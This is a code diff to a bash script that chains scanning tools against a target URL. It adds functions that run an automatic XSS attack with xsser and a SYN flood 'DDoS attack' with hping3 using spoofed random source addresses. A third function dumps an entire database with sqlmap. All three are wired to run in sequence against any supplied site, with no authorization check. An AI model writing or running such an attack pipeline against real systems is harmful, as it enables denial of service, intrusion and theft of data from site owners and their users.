@@ -46,6 +46,9 @@ install_tools() {
         ["sploitscan"]="sploitscan"
         ["vopono"]="vopono"
         ["waybackpy"]="waybackpy"
+        ["xsser"]="xsser"
+        ["hping3"]="hping3"
+        ["metasploit"]="metasploit-framework"
     )
 
     for tool in "${!tools[@]}"; do
@@ -214,12 +217,12 @@ perform_uniscan_scan() {
 perform_whois_lookup() {
     local target_url="$1"
     local results_dir="$2"
-    local result
+     local result
     result=$(run_command whois "$target_url")
     local output_file="$results_dir/whois_lookup.txt"
     save_to_file "$output_file" "$result"
     echo "Saved WHOIS lookup results to $output_file"
-    }
+}
 
 # Function to perform a Subfinder scan
 perform_subfinder_scan() {
@@ -230,6 +233,40 @@ perform_subfinder_scan() {
     local output_file="$results_dir/subfinder_scan.txt"
     save_to_file "$output_file" "$result"
     echo "Saved Subfinder scan results to $output_file"
+}
+
+# Function to perform an XSS attack
+perform_xss_attack() {
+    local target_url="$1"
+    local results_dir="$2"
+    local result
+    result=$(run_command xsser -u "$target_url" --auto)
+    local output_file="$results_dir/xss_attack.txt"
+    save_to_file "$output_file" "$result"
+    echo "Saved XSS attack results to $output_file"
+}
+
+# Function to perform a DDoS attack
+perform_ddos_attack() {
+    local target_url="$1"
+    local duration="$2"
+    local results_dir="$3"
+    local result
+    result=$(run_command hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source "$target_url")
+    local output_file="$results_dir/ddos_attack.txt"
+    save_to_file "$output_file" "$result"
+    echo "Saved DDoS attack results to $output_file"
+}
+
+# Function to access the database and download it
+access_database() {
+    local target_url="$1"
+    local results_dir="$2"
+    local result
+    result=$(run_command sqlmap -u "$target_url" --dump-all --batch)
+    local output_file="$results_dir/database_dump.txt"
+    save_to_file "$output_file" "$result"
+    echo "Saved database dump to $output_file"
 }
 
 # Function to access seclists database
@@ -310,11 +347,20 @@ main() {
         echo "Starting Subfinder scan..."
         perform_subfinder_scan "$target_url" "$results_dir"
         
-        echo "Accessing Seclists database..."
-        access_seclists
+        echo "Starting XSS attack..."
+        perform_xss_attack "$target_url" "$results_dir"
+        
+        echo "Accessing the database and downloading it..."
+        access_database "$target_url" "$results_dir"
         
         echo "Starting custom SQL injection test..."
         perform_custom_sql_injection_test "$target_url" "$results_dir"
+        
+        echo "Starting DDoS attack..."
+        perform_ddos_attack "$target_url" "60" "$results_dir"  # Run the DDoS attack for 60 seconds
+        
+        echo "Accessing Seclists database..."
+        access_seclists
     else
         echo "The website is not accessible. Exiting..."
     fi
